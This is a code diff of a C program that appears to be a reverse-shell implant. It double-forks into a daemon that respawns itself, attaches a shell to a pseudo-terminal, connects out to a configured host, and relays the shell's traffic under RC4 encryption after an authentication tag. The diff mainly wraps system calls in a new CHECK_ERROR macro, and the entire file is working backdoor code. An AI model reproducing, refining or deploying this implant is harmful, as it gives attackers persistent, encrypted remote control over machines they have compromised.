@@ -60,7 +60,16 @@
         exit(errno ? errno : 1);                               \
     }
 
+#define CHECK_ERROR(func_call)         \
+    ({                                 \
+        __auto_type ret = (func_call); \
+        if (ret < 0)                   \
+            FATAL(#func_call);         \
+        ret;                           \
+    })
+
 #define DEBUG_PROCESS_EXIT(status, msg)                     \
+    do                                                      \
     {                                                       \
         if (DAEMONIZE)                                      \
             break;                                          \
@@ -73,7 +82,7 @@
         else                                                \
             fprintf(stderr, msg "with unknown status %d\n", \
                     status);                                \
-    }
+    } while (0)
 
 #define CRC64_ECMA_182_POLY 0x42F0E1EBA9EA3693ULL
 
@@ -152,61 +161,48 @@ uint64_t crc64(const char *s)
 
 int main()
 {
-    int pid;
+    pid_t pid;
 
 #if DAEMONIZE
     for (int i = 0; i < 2; i++)
     {
-        pid = fork();
-        if (pid < 0)
-            FATAL("daemonize fork")
-        else if (pid > 0)
+        pid = CHECK_ERROR(fork());
+        if (pid > 0)
             return 0;
     }
 #endif
 
     for (;;)
     {
-        pid = fork();
-        if (pid < 0)
-            FATAL("daemon fork")
-        else if (pid == 0)
+        pid = CHECK_ERROR(fork());
+        if (pid == 0)
             break;
 
         int status;
         waitpid(pid, &status, 0);
-        DEBUG_PROCESS_EXIT(status, "Daemon child exited ")
+        DEBUG_PROCESS_EXIT(status, "Daemon child exited ");
         sleep(1);
     }
 
     // Create a pty
     int master, slave;
-    if (openpty(&master, &slave, NULL, NULL, NULL) < 0)
-        FATAL("openpty");
+    CHECK_ERROR(openpty(&master, &slave, NULL, NULL, NULL));
 
     // Fork
-    if ((pid = fork()) < 0)
-        FATAL("fork")
-    else if (pid == 0)
+    pid = CHECK_ERROR(fork());
+    if (pid == 0)
     {
         // Child
         // Close the master side of the pty
         close(master);
 
-        if (setsid() < 0)
-            FATAL("setsid")
-
-        // Set the slave side of the pty as the controlling terminal
-        if (ioctl(slave, TIOCSCTTY, NULL) < 0)
-            FATAL("ioctl")
-
-        dup2(slave, STDIN_FILENO);
-        dup2(slave, STDOUT_FILENO);
-        dup2(slave, STDERR_FILENO);
+        CHECK_ERROR(dup2(slave, STDIN_FILENO));
+        CHECK_ERROR(dup2(slave, STDOUT_FILENO));
+        CHECK_ERROR(dup2(slave, STDERR_FILENO));
 
         // Execute a shell
-        execl(SHELL_COMMAND, SHELL_COMMAND, NULL);
-        FATAL("execl");
+        CHECK_ERROR(execl(SHELL_COMMAND, SHELL_COMMAND, NULL));
+        return 0;
     }
 
     // Parent
@@ -214,9 +210,7 @@ int main()
     close(slave);
 
     // Create a socket
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd < 0)
-        FATAL("socket");
+    int sockfd = CHECK_ERROR(socket(AF_INET, SOCK_STREAM, 0));
 
     // Specify an address to connect to
     struct sockaddr_in addr;
@@ -225,8 +219,7 @@ int main()
     addr.sin_addr.s_addr = inet_addr(CONNECT_HOST);
 
     // Connect it
-    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
-        FATAL("connect");
+    CHECK_ERROR(connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)));
 
     // tag format: crc64(ENCRYPTION_KEY + "%d" % time())
     time_t tag_time = time(NULL);
@@ -243,8 +236,7 @@ int main()
         mangled_encryption_key[i] ^= tag_buf[i % sizeof(tag_buf)];
 
     // Send tag
-    if (send(sockfd, &tag_buf, sizeof(tag_buf), 0) < 0)
-        FATAL("send tag")
+    CHECK_ERROR(send(sockfd, &tag_buf, sizeof(tag_buf), 0));
 
     // Initialize RC4 states
     rc4_state rc4recv, rc4send;
@@ -262,28 +254,19 @@ int main()
         FD_SET(sockfd, &readfds);
         FD_SET(master, &readfds);
 
-        struct timeval timeout;
-        timeout.tv_sec = 0;
-        timeout.tv_usec = 100 * 1000; // 100ms
-
-        if (select(fd_max + 1, &readfds, NULL, NULL, &timeout) < 0)
-            FATAL("select")
+        CHECK_ERROR(select(fd_max + 1, &readfds, NULL, NULL, NULL));
 
         ssize_t n;
         // Read from socket and write to pty
         if (FD_ISSET(sockfd, &readfds))
             for (;;)
             {
-                n = recv(sockfd, buffer, sizeof(buffer), 0);
-                if (n < 0)
-                    FATAL("recv read")
+                n = CHECK_ERROR(recv(sockfd, buffer, sizeof(buffer), 0));
                 if (n == 0)
                     goto end_loop;
-
                 for (ssize_t i = 0; i < n; i++)
                     buffer[i] ^= rc4_next(&rc4recv);
-                write(master, buffer, n);
-
+                CHECK_ERROR(write(master, buffer, n));
                 // Break if the buffer is not full (i.e., no more data to read)
                 if ((size_t)n < sizeof(buffer))
                     break;
@@ -293,44 +276,20 @@ int main()
         if (FD_ISSET(master, &readfds))
             for (;;)
             {
-                n = read(master, buffer, sizeof(buffer));
-                if (n < 0)
-                    FATAL("send read")
+                n = CHECK_ERROR(read(master, buffer, sizeof(buffer)));
                 if (n == 0)
                     goto end_loop;
-
                 for (ssize_t i = 0; i < n; i++)
                     buffer[i] ^= rc4_next(&rc4send);
-                write(sockfd, buffer, n);
-
+                CHECK_ERROR(send(sockfd, buffer, n, 0));
                 if ((size_t)n < sizeof(buffer))
                     break;
             }
     }
 
 end_loop:
-    // send EOF to the socket
-    shutdown(sockfd, SHUT_WR);
-
-    // SIGTERM entire process group to kill the shell
     kill(-pid, SIGTERM);
-    for (int i = 0; i < 10; i++)
-    {
-        sleep(1);
-        int status;
-        if (waitpid(-pid, &status, WNOHANG) < 0)
-            continue;
-        DEBUG_PROCESS_EXIT(status, "Shell exited ")
-        goto cleanup;
-    }
-
-#if !DAEMONIZE
-    fprintf(stderr, "Shell did not exit, killing\n");
-#endif
-    if (kill(-pid, SIGKILL) < 0)
-        FATAL("kill execl child")
-cleanup:
-    close(sockfd);
+    shutdown(sockfd, SHUT_WR);
     close(master);
     return 0;
 }
